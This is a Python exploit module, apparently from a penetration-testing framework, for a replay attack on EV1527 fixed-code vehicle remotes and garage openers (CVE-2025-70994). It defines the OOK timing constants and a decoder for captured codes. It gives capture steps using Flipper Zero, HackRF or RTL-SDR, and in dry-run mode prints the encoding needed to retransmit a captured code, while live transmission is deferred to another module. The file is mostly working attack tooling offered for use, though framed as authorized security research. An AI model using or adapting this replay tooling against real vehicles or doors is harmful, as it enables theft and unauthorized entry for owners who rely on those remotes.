"""EV1527 / OOK Rolling Code Vehicle Replay Attack (CVE-2025-70994).

Various cheap vehicle remote controls using the EV1527 OOK protocol do not
implement rolling codes — they transmit fixed 24-bit codes that can be
captured and replayed.  CVE-2025-70994 covers a specific ISM-band vehicle
remote using this protocol where the manufacturer's documentation explicitly
states rolling codes are implemented but they are not.

CVSS: 5.4 Medium | AV:P/AC:L/PR:N/UI:N (physical-adjacent)

Original research / PoC credits
--------------------------------
CVE     : CVE-2025-70994
CVSS    : 5.4 (Medium)
Source  : WirelessXPL-Forge wirelessxpl/modules/generic/subghz/
          ev1527_vehicle_cve_2025_70994.py

EmbedXPL port
-------------
Maintainer : Andre Henrique (@mrhenrike) | Uniao Geek

# authorized use only
"""
from __future__ import annotations

from embedxpl.core.exploit import *


_CVE = "CVE-2025-70994"

# EV1527 timing constants (µs)
_EV1527_SYNC = 9600
_EV1527_BIT_ONE_HIGH = 1200
_EV1527_BIT_ZERO_HIGH = 400
_EV1527_BIT_LOW = 400


def _decode_ev1527(raw_timings: list) -> int | None:
    """Decode EV1527 OOK timings to 24-bit code."""
    if len(raw_timings) < 48:
        return None
    code = 0
    for i in range(24):
        high = raw_timings[i * 2]
        if high > 800:
            code |= (1 << (23 - i))
    return code


class Exploit(Exploit):
    """EV1527 Vehicle Replay Attack (CVE-2025-70994)."""

    __info__ = {
        "name": "EV1527 Vehicle Replay Attack (CVE-2025-70994)",
        "description": (
            "EV1527 OOK protocol vehicle remotes (315/433 MHz) do not use rolling codes "
            "despite documentation claims. Fixed 24-bit codes captured and replayed. "
            "CVE-2025-70994. CVSS 5.4. Requires: Flipper Zero / HackRF / RTL-SDR."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://www.cve.org/CVERecord?id=CVE-2025-70994",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-70994",
            "https://flipperzero.one/",
        ),
        "devices": ("EV1527-based vehicle remotes / garage openers at 315/433 MHz",),
    }

    code_hex = OptString("", "Captured 24-bit EV1527 code (hex, e.g. 'A1B2C3')")
    freq_mhz = OptString("433.92", "Carrier frequency in MHz")
    hw_tool = OptString("flipper_zero", "RF hardware: flipper_zero | hackrf | rtlsdr")
    dry_run = OptBool(True, "Dry run — describe only")

    @mute
    def check(self) -> bool:
        return True

    def run(self) -> None:
        code_hex = str(self.code_hex)
        freq = str(self.freq_mhz)
        hw = str(self.hw_tool)
        dry_run = bool(self.dry_run)

        print_status(f"EV1527 vehicle replay attack — {_CVE}")

        if not code_hex:
            print_info("No code specified. Capture first with: Flipper Zero → Sub-GHz → Read")
            print_info(f"Target frequency: {freq} MHz, protocol: EV1527 (OOK)")
            return

        try:
            code = int(code_hex, 16) & 0xFFFFFF
        except ValueError:
            print_error("Invalid hex code format")
            return

        print_info(f"Code: 0x{code:06X} ({code:024b}b) | Freq: {freq} MHz | HW: {hw}")

        if dry_run:
            print_info(
                f"DRY-RUN: Would transmit EV1527 code 0x{code:06X} at {freq} MHz. "
                f"Encoding: sync {_EV1527_SYNC}µs + 24 bits (1={_EV1527_BIT_ONE_HIGH}µs high, "
                f"0={_EV1527_BIT_ZERO_HIGH}µs high). "
                f"Use Flipper Zero Sub-GHz → 'Send Saved' or hackrf_transfer."
            )
        else:
            print_warning(
                f"Live RF transmission for {_CVE}. "
                "Use WirelessXPL-Forge ev1527_vehicle module with Flipper Zero / HackRF integration."
            )
